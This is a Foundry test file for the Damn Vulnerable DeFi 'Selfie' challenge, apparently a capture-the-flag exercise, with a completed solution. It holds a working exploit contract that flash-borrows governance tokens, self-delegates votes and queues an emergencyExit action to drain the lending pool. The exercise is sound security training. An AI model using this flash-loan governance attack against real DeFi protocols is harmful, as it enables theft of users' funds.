// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";


contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        console.log("### test_selfie start ###");

        console.log("");
        console.log("#1 Before attack");
        console.log("Balance of pool:", token.balanceOf(address(pool))/1e18);
        console.log("Balance of recovery:", token.balanceOf(recovery)/1e18);

        console.log("");
        console.log("#2 Run attack");
        run_attack();

        console.log("");
        console.log("#3 After attack");
        console.log("Balance of pool:", token.balanceOf(address(pool))/1e18);
        console.log("Balance of recovery:", token.balanceOf(recovery)/1e18);

        console.log("");
        console.log("### test_selfie end ###");
    }

    function run_attack() public {
        AttackSelfie attackContract = new AttackSelfie(address(pool), address(governance), address(token), recovery);

        attackContract.attack();

        // Advance time by 2 days to be able to execute the action
        vm.warp(block.timestamp + 2 days + 1);
        attackContract.executeAction();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}


/**
  * CODE YOUR SOLUTION HERE
  */
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract AttackSelfie is IERC3156FlashBorrower {
    SelfiePool private pool;
    SimpleGovernance private governance;
    DamnValuableVotes private token;
    address private recovery;
    uint256 private actionId;

    constructor(address _pool, address _governance, address _token, address _recovery) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token = DamnValuableVotes(_token);
        recovery = _recovery;
    }

    function attack() external {
        // Step 1: Take out a flash loan of the tokens
        uint256 amount = pool.maxFlashLoan(address(token));

        console.log("Step #1: Flash loan amount:", amount/1e18);
        pool.flashLoan(this, address(token), amount, "");
    }

    function onFlashLoan(address, address, uint256 amount, uint256, bytes calldata) external returns (bytes32) {
        // Step 2: Use the tokens to queue the action in governance
        console.log("Step #2: onFlashLoan call delegate:", amount/1e18);
        // Important: delegate to yourself to have voting power
        token.delegate(address(this));
        console.log("Now Votes of AttackSelfie ", token.getVotes(address(this)));

        // Step 3: Queue the action to drain all funds to recovery address
        console.log("Step #3: Queuing action to drain all funds to recovery address:", recovery);
        actionId = governance.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", recovery)
        );

        // Repay the flash loan
        token.approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function executeAction() external {
        // Step 4: Execute the action
        console.log("Step #4: Execute the action:", actionId);
        governance.executeAction(actionId);
    }
}
